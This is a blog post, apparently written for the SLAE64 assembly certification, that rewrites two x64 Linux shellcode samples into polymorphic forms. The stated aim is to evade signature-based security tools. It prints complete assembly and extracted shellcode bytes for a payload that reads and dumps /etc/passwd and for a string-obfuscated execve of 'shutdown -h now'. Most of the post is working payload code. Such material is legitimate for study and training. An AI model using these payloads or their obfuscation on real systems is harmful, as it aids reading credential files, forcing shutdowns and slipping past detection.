@@ -1,0 +1,354 @@
++++
+title = "Security Tube SLAE64 Course - Assessment 6 - Polymorphic Payloads"
+author = "Codehead"
+layout = "post"
+date = "2017-11-22T14:02:00"
+url = "/slae64-06-polymophic-payloads/"
+categories = [ "SLAE64", "Assembler", "Shellcode", "linux" ]
+tags = [ "shellcode", "assembler", "linux", "x64" ]
++++
+
+After completing the video lectures of the [Security Tube Linux 64 bit Assembler Expert course (SLAE64)](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html), a series of assessments must be completed to gain certification. This is the sixth assignment; take three x64 payloads from [ShellStorm](http://shell-storm.org/shellcode/) and create new, polymorphic versions which have the same functionality. While this sounds super cool, what we're actually doing is simply changing the content of the shellcode to try to evade detection by simple security tools that use signature based matching. A limitation of the assignment is to stay within 150% of the original payload size.
+
+<!--more-->
+
+## Dump Password Payload
+
+As most of the previous assignments have focused on network operations, I chose the first shellcode sample because it used file I/O.
+
+The starting point is [Mr.Un1k0d3r's Read /etc/passwd](http://shell-storm.org/shellcode/files/shellcode-878.php) payload which is 82 bytes in size:
+
+{{< highlight asm >}}
+BITS 64
+; Author Mr.Un1k0d3r - RingZer0 Team
+; Read /etc/passwd Linux x86_64 Shellcode
+; Shellcode size 82 bytes
+global _start
+
+section .text
+
+_start:
+jmp _push_filename
+  
+_readfile:
+; syscall open file
+pop rdi ; pop path value
+; NULL byte fix
+xor byte [rdi + 11], 0x41
+  
+xor rax, rax
+add al, 2
+xor rsi, rsi ; set O_RDONLY flag
+syscall
+  
+; syscall read file
+sub sp, 0xfff
+lea rsi, [rsp]
+mov rdi, rax
+xor rdx, rdx
+mov dx, 0xfff; size to read
+xor rax, rax
+syscall
+  
+; syscall write to stdout
+xor rdi, rdi
+add dil, 1 ; set stdout fd = 1
+mov rdx, rax
+xor rax, rax
+add al, 1
+syscall
+  
+; syscall exit
+xor rax, rax
+add al, 60
+syscall
+  
+_push_filename:
+call _readfile
+path: db "/etc/passwdA"
+{{</ highlight >}}
+
+The original code uses the jump, call, pop method to locate the address of the '/etc/passwd' string at the end of the payload. We can mutate this by converting the string into a hex number and pushing it onto the stack. This involves reversing the string and breaking it into 8 byte chunks. 
+
+We can't use a NULL terminator on the string, so we'll use a value of 0x1 and fix it afterwards.
+
+{{< highlight asm >}}
+push 0x01647773             ; 0x01 + dws
+mov rbx, 0x7361702f6374652f ; sap/cte/
+push rbx
+mov rdi, rsp                ; Get address of path string
+dec byte [rdi+11]           ; NULL byte fix
+{{</ highlight >}}
+
+This change saves 2 bytes and transforms the raw strings visible in the shellcode.
+
+The remainder of the first section sets the parameters for the <tt>SYS_OPEN</tt> syscall. We can modify these and save another 2 bytes:
+
+{{< highlight asm >}}
+push 2
+sub rsi, rsi           ; set O_RDONLY flag
+pop rax
+syscall
+{{</ highlight >}}
+
+The next section of the payload uses <tt>SYS_READ</tt> to read the content of the file into a buffer of 0xfff (4096 decimal) bytes which is allocated on the stack. There isn't much to work with here, but we can optimise the parameter shuffling by swapping in known zero values instead of XORing and use a subtract operation to hide the 0xfff value.
+
+{{< highlight asm >}}
+push rax        ; Save file ID
+xchg rsi, rax   ; Zero out RAX
+push rax
+pop rdx
+pop rdi
+sub dx, 0xf001
+sub rsp, rdx    ; Make room on the stack
+lea rsi, [rsp]  ; Pass the buffer address
+syscall
+{{</ highlight >}}
+
+These changes save a further 4 bytes.
+
+The third section uses <tt>SYS_WRITE</tt> to dump the data from the stack buffer to <tt>STDOUT</tt>. Again, there isn't much to work with, but by optimising the parameters we can save 8 bytes:
+
+{{< highlight asm >}}
+push 1
+pop rdx
+xchg rax, rdx   ; syscall id and read size
+push rax
+pop rdi         ; fd id
+syscall
+{{</ highlight >}}
+
+The last section is a simple <tt>SYS_EXIT</tt>, all we can do here is try to save some bytes:
+
+{{< highlight asm >}}
+push 60
+pop rax
+syscall
+{{</ highlight >}}
+
+Putting the whole thing together gives us [pw_dump.nasm](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_6/pw_dump.nasm):
+
+{{< highlight asm >}}
+push 0x01647773
+mov rbx, 0x7361702f6374652f
+push rbx
+mov rdi, rsp      ; Get addr of path string
+dec byte [rdi+11] ; NULL byte fix
+push 2
+sub rsi, rsi      ; set O_RDONLY flag
+pop rax
+syscall           ; sys_open
+
+push rax          ; Save file ID
+xchg rsi, rax     ; Zero out RAX
+push rax
+pop rdx
+pop rdi           ; File ID
+sub dx, 0xf001
+sub rsp, rdx      ; Make room on the stack
+lea rsi, [rsp]    ; Pass the buffer address
+syscall           ; sys_read
+
+push 1
+pop rdx
+xchg rax, rdx     ; syscall id and read size
+push rax
+pop rdi           ; STDOUT (1)
+syscall           ; sys_write
+
+push 60 
+pop rax
+syscall           ; sys_exit
+{{</ highlight >}}
+
+Extracting the payload results in a 64 byte shellcode string; a saving of 18 bytes:
+
+{{< highlight text >}}
+"\x68\x73\x77\x64\x01\x48\xbb\x2f\x65\x74\x63\x2f"
+"\x70\x61\x73\x53\x48\x89\xe7\xfe\x4f\x0b\x6a\x02"
+"\x48\x29\xf6\x58\x0f\x05\x50\x48\x96\x50\x5a\x5f"
+"\x66\x81\xea\x01\xf0\x48\x29\xd4\x48\x8d\x34\x24"
+"\x0f\x05\x6a\x01\x5a\x48\x92\x50\x5f\x0f\x05\x6a"
+"\x3c\x58\x0f\x05"
+{{</ highlight >}}
+
+### Shutdown
+
+The next shellcode sample top be tackled is ['shutdown -h now' by Osanda Malith Jayathissa](http://shell-storm.org/shellcode/files/shellcode-877.php) which is a 65 byte payload.
+
+{{< highlight asm >}}
+; Title: shutdown -h now x86_64 Shellcode - 65 bytes
+; Platform: linux/x86_64
+; Date: 2014-06-27
+; Author: Osanda Malith Jayathissa (@OsandaMalith)
+
+section .text
+
+global _start
+
+_start:
+
+xor rax, rax
+xor rdx, rdx 
+
+push rax
+
+push byte 0x77
+push word 0x6f6e ; now
+mov rbx, rsp
+
+push rax
+push word 0x682d ;-h
+mov rcx, rsp
+
+push rax
+mov r8, 0x2f2f2f6e6962732f ; /sbin/shutdown
+mov r10, 0x6e776f6474756873
+push r10
+push r8
+mov rdi, rsp
+
+push rdx
+push rbx
+push rcx
+push rdi
+mov rsi, rsp
+
+add rax, 59
+syscall
+{{</ highlight >}}
+
+There has is another version of this code from another SLAE student on the ShellStorm site which is 1 byte smaller and uses some payload encoding. I decided to start with the original and see what I could do.
+
+The code is an <tt>execve</tt> call to the system's <tt>shutdown</tt> command. At the start the <tt>RAX</tt> and <tt>RDX</tt> registers are cleared. Looking through the code, <tt>RDX</tt> isn't used until the end where becomes a syscall parameter and <tt>RAX</tt> is used to push zeros onto the stack until the syscall at the end. This seems wasteful so we'll just clear <tt>RDX</tt> for zero pushes and worry about <tt>RAX</tt> later.
+
+{{< highlight asm >}}
+_start:
+xor rdx, rdx
+push rdx
+{{</ highlight >}}
+
+The first <tt>PUSH</tt> adds a NULL to end the argument array.
+
+The next three sections push the argument strings onto the stack. As we're working through the argument array in reverse, The '<tt>now</tt>' string is the first item.
+
+The original code uses pushes of hexadecimal values to build the strings. I decided to use <tt>NOT</tt> inverted strings throughout the code to hide the content. This conceals the string values in the raw shellcode and gets around the NULL byte problem at the same time. However, pushing and <tt>NOT</tt>ing the strings one at a time bloated the shellcode up to about 82 bytes.
+
+{{< highlight asm >}}
+...
+
+push dword 0xffffffffff889091  ; inverse of 'now\x00'
+not qword [rsp]
+push rsp
+pop rbx
+
+...
+{{</ highlight >}}
+
+A second attempt at pushing the inverted strings and running a <tt>NOT</tt> loop over the stack afterwards got the code down to 76 bytes, but this was still not good enough. Some restructuring is required.
+
+First, we define our inverted strings as data bytes and get the address using the jump, call, pop method:
+
+{{< highlight asm >}}
+  jmp _str ; Get addr of strings in RAX
+_build:
+  pop rax  
+
+  ...
+
+_str:
+  call _build
+_now: db 0x91, 0x90, 0x88, 0xff
+_h:   db 0xd2, 0x97, 0xff
+_cmd: db 0xd0, 0x8c, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0x8a, 0x8b, 0x9b, 0x90, 0x88, 0x91, 0xff
+{{</ highlight>}}
+
+With the start address of the data in <tt>RAX</tt>, we can build the argument array on the stack and store its address in <tt>RSI</tt> ready for the <tt>execve</tt> syscall:
+
+{{< highlight asm >}}
+push rax           ; 'now'
+lea rdi, [rax+4]   ; '-h'
+push rdi
+lea rdi, [rax+7]   ; '/sbin/shutdown'
+push rdi
+push rsp           ; Save arg array addr
+pop rsi
+{{</ highlight >}}
+
+Using <tt>RDI</tt> for the effective address calculations also means that the command string for the syscall is populated at this point.
+
+The strings are still mangled, but we can run the <tt>NOT</tt> loop over the original location using the value in <tt>RAX</tt>:
+
+{{< highlight asm >}}
+push 0x16
+pop rcx
+_decode:
+not byte [rax]
+inc rax
+loop _decode
+{{</ highlight >}}
+
+Now <tt>RDI</tt> and <tt>RSI</tt> point to decoded strings, <tt>RDX</tt> was cleared at the start, all that remains is to trigger the syscall:
+
+{{< highlight asm >}}
+push 0x3b
+pop rax
+syscall
+{{</ highlight >}}
+
+The complete listing of [shutdown.nasm](shutdown.nasm) results in 62 bytes of shellcode, just under the original and alternative implementations.
+
+{{< highlight asm >}}
+global _start
+section .TEXT exec write
+
+_start:
+  xor rdx, rdx
+  push rdx ; NULL to terminate arg array
+
+  jmp _str ; Get addr of strings in RAX
+_build:
+  pop rax  
+
+; Load string addresses onto stack
+  push rax           ; 'now'
+  lea rdi, [rax+4]   ; '-h'
+  push rdi
+  lea rdi, [rax+7]   ; '/sbin/shutdown'
+  push rdi
+  push rsp           ; Save arg array addr
+  pop rsi
+
+; Decode strings
+  push 0x16
+  pop rcx
+_decode:
+  not byte [rax]
+  inc rax
+  loop _decode
+
+  push 0x3b
+  pop rax
+  syscall
+
+_str:
+  call _build
+_now: db 0x91, 0x90, 0x88, 0xff
+_h:   db 0xd2, 0x97, 0xff
+_cmd: db 0xd0, 0x8c, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0x8a, 0x8b, 0x9b, 0x90, 0x88, 0x91, 0xff
+
+; Shellcode - 62 bytes
+; "\x48\x31\xd2\x52\xeb\x1d\x58\x50\x48\x8d\x78"
+; "\x04\x57\x48\x8d\x78\x07\x57\x54\x5e\x6a\x16"
+; "\x59\xf6\x10\x48\xff\xc0\xe2\xf9\x6a\x3b\x58"
+; "\x0f\x05\xe8\xde\xff\xff\xff\x91\x90\x88\xff"
+; "\xd2\x97\xff\xd0\x8c\x9d\x96\x91\xd0\x8c\x97"
+; "\x8a\x8b\x9b\x90\x88\x91\xff"; 
+{{</ highlight >}}
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
+
+Student ID: SLAE64-1471
+
